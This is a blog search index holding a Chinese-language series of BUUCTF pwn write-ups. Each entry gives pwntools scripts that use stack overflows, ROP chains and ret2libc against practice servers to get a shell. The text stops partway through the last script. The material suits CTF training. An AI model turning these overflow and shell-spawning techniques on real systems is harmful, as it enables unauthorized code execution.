<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuctf pwn</title>
      <link href="/2020/02/13/buuctf/"/>
      <url>/2020/02/13/buuctf/</url>
      
        <content type="html"><![CDATA[<h3 id="1-测试nc"><a href="#1-测试nc" class="headerlink" title="1.测试nc"></a>1.测试nc</h3><a id="more"></a><p>nc 出结果</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>简单的栈溢出</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn1")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28852</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please input"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0xf</span> + <span class="number">8</span>)+ p64(<span class="number">0x401186</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>但是出现了问题，无法在远程无法打通参考文章</p><p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p><p>我们这里选择转移栈地址</p><p>由于text段中有call system 所以我们有两种exp的写法</p><p>现在在我看来这两个exp的主要区别在于</p><p>payload += p64(0x0000000000401191)</p><p>这一串payload</p><p>在第2个payload中，如果去掉上面那个，本地可以打通，但是远程无法打通，应该是因为堆栈没有对齐</p><p>但是我们加入了上面那一串后，那一串的地址为一个没有参数的函数，所以我们把system的地址放入了其返回地址处，如果有参数的话我们放入的system地址变为了参数，就无法调用system，暂时这样里理解</p><p><a href="https://www.jianshu.com/p/4928e726a43f" target="_blank" rel="noopener">https://www.jianshu.com/p/4928e726a43f</a></p><p>1</p><p>这里我们使用的是text中的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./pwn1'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28852'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(file_name)</span></span><br><span class="line"></span><br><span class="line">p = remote(ip,int(port))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=<span class="number">0x40201B</span></span><br><span class="line">pop_rdi=<span class="number">0x4011fb</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0x0000000000401191</span>)</span><br><span class="line"><span class="comment">#payload += p64(elf.symbols["system"])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>2</p><p>这里使用的是elf.symbols获取的system地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./pwn1'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28852'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(file_name)</span></span><br><span class="line"></span><br><span class="line">p = remote(ip,int(port))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=<span class="number">0x40201B</span></span><br><span class="line">pop_rdi=<span class="number">0x4011fb</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0x0000000000401016</span>)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">"system"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3 warmup_csaw_2016"></a>3 warmup_csaw_2016</h2><p>sprintf()函数泄露了危险函数地址</p><p>简单的栈溢出漏洞</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">"node3.buuoj.cn"</span></span><br><span class="line">port = <span class="string">"26985"</span></span><br><span class="line">file_name = <span class="string">"./1"</span></span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"WOW:"</span>)</span><br><span class="line"><span class="comment">#print p.recvline()[0:-1].ljust(8,"\x00")</span></span><br><span class="line"><span class="comment">#print p.recvline()[0:-1]</span></span><br><span class="line"></span><br><span class="line">sys_add = int(p.recvline()[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> sys_add</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(sys_add)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/yishizuofei/article/details/78195255" target="_blank" rel="noopener">https://blog.csdn.net/yishizuofei/article/details/78195255</a><br>sprintf函数</p><h2 id="4-pwn1-sctf-2016"><a href="#4-pwn1-sctf-2016" class="headerlink" title="4.pwn1_sctf_2016"></a>4.pwn1_sctf_2016</h2><p><a href="https://www.runoob.com/cprogramming/c-function-fgets.html" target="_blank" rel="noopener">https://www.runoob.com/cprogramming/c-function-fgets.html</a></p><p>fget()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">'/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'27432'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line">backdoor = <span class="number">0x08048F0D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"I"</span> * <span class="number">0x14</span> + <span class="string">"a"</span> * <span class="number">4</span> + p32(backdoor)</span><br><span class="line"><span class="comment">#p.recvuntil("Tell me something about yourself: ")</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><p>貌似p.recvuntil()无法接受到print打印的数据，，貌似</p><h2 id="5-iscn-2019-c-1"><a href="#5-iscn-2019-c-1" class="headerlink" title="5 iscn_2019_c_1"></a>5 iscn_2019_c_1</h2><p>这个题的大致思路就是通过栈溢出漏洞将某个函数的got地址通过puts函数泄露出来从而获取libc的版本</p><p>获取libc版本后搜索system或者execve的地址与bin/sh从而获取shell</p><p>附上libcsearch的github</p><p><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p><p>exp:</p><p>先膜拜大佬pumpink9的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">file_name = <span class="string">'./ciscn_2019_c_1'</span></span><br><span class="line">libc_name = <span class="string">'../libc/18-libc64.so'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'25405'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(ip,int(port))</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = ELF(<span class="string">"../libc/18-libc64.so"</span>)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">main = <span class="number">0x000000000400B28</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x50</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(rdi_ret)+p64(elf.got[<span class="string">'__libc_start_main'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">"encrypted\n"</span>,(payload))</span><br><span class="line">p.recvuntil(<span class="string">"@\n"</span>)</span><br><span class="line">addr = u64(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">ls(<span class="string">"libc start main"</span>,addr)</span><br><span class="line">libc.address = addr-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">ls(<span class="string">"libc addr"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x58</span></span><br><span class="line">payload +=  p64(rdi_ret)+p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next())+p64(ret)+p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">"choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"encrypted\n"</span>,(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>之后在上我本地能打通，远程打不通的exp（估计是因为libc不行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28653'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"><span class="comment">#p = remote(ip,port)</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400790</span></span><br><span class="line">put_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> put_got</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice!'</span>,<span class="string">"1"</span>)</span><br><span class="line">payload1 = <span class="string">"a"</span> * (offset + <span class="number">8</span>) + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(start)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"@\n"</span>)</span><br><span class="line">add = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="comment">#print add</span></span><br><span class="line"><span class="comment">#print p.recvall()</span></span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,hex(add))</span><br><span class="line">libc_add = add - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line"><span class="keyword">print</span> libc_add</span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Input your choice!"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload2 = <span class="string">"a"</span> * (offset + <span class="number">8</span>) + p64(pop_rdi) + p64(bin_add) + p64(sys_add)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="6-HarekazeCTF2019-baby-rop2"><a href="#6-HarekazeCTF2019-baby-rop2" class="headerlink" title="6.[HarekazeCTF2019]baby_rop2"></a>6.[HarekazeCTF2019]baby_rop2</h2><p>有点小难受，第一次用printf泄露</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'29757'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400636</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#print_plt = elf.got['printf']</span></span><br><span class="line">printf_plt = <span class="number">0x4004f0</span></span><br><span class="line"><span class="comment">#print hex(print_plt)</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x20</span>) + <span class="string">"a"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's your name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">read_add = u64(p.recv(<span class="number">6</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(read_add)</span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>,int(read_add))</span><br><span class="line">base_add = read_add - libc.dump(<span class="string">"read"</span>)</span><br><span class="line">sys_add = base_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">str_bin_sh = base_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print str_bin_sh</span></span><br><span class="line">payload2 = <span class="string">'a'</span> * (<span class="number">0x20</span>) + <span class="string">'a'</span> * <span class="number">8</span> + p64(pop_rdi) + p64(str_bin_sh) + p64(sys_add) + p64(main)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="7-get-started-3dsctf-2016"><a href="#7-get-started-3dsctf-2016" class="headerlink" title="7.get_started_3dsctf_2016"></a>7.get_started_3dsctf_2016</h2><p>啥也不会，，涉及到内存修改的问题</p><h3 id="第一个本地能打通的思路-远程打不了"><a href="#第一个本地能打通的思路-远程打不了" class="headerlink" title="第一个本地能打通的思路(远程打不了)"></a>第一个本地能打通的思路(远程打不了)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">修改eip跳转到get_flag函即可,可是直接进行跳转到该函数,会存在一个过滤,把该地址给过滤掉了,其实往后退几个指令就行</span><br><span class="line">在buuctf里远程打不了.</span><br><span class="line"></span><br><span class="line">外国大牛博客:http://www.infohelp.org</span><br><span class="line">下面是本地能打的exp,(前提是你自己创建了一个flag.txt文件)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">printf_addr = <span class="number">0x0804F0E0</span></span><br><span class="line">main = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489B8</span></span><br><span class="line">payload_01 = <span class="string">'A'</span> * <span class="number">56</span> + p32(get_flag)</span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="第二个思路-该方法能打远程"><a href="#第二个思路-该方法能打远程" class="headerlink" title="第二个思路:(该方法能打远程)"></a>第二个思路:(该方法能打远程)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.</span><br><span class="line">首先按先说一下mprotect函数:原型如下</span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr 内存启始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限</span><br><span class="line">要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或</span><br><span class="line">$ .&#x2F; get_started_3dsctf_2016 &amp;</span><br><span class="line">$ cat &#x2F;proc&#x2F;[you_pid]&#x2F;maps 查看内存区域</span><br><span class="line">可以查看到,内存可读可写的地址为: 0x80EB000 ,所以我们对该内存进行增加一个权限</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span 